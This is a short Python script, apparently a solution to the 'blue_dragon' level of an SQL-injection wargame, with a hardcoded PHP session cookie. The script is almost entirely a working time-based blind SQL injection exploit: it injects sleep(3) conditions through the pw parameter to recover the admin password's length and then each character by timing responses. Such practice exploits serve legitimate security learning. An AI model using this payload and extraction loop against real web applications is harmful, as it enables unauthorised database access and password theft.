import requests
import time

cookies={'PHPSESSID':'8pt5qvotaijsant070i27b03jq'}
length=0
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    start=time.time()
    address="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
    url=address+"?pw=' or id='admin' and if(length(pw)="+str(length)+",sleep(3),0)%23"
    length+=1
    res=requests.get(url,cookies=cookies)
    if  time.time()-start>3:
        length-=1
        print("pw는 "+str(length)+"자리")
        break
i=length
pw=""
for a in range(1,i+1):
    for b in range(33,128):
        start=time.time()
        url = address + "?pw=' or id='admin' and if(ascii(substr(pw,"+str(a)+",1))="+str(b)+",sleep(3),0)%23"
        res=requests.get(url,cookies=cookies)
        if time.time()-start>3:
            print(str(a)+"of pw=>"+chr(b))
            pw+=chr(b)
            break

print(pw)
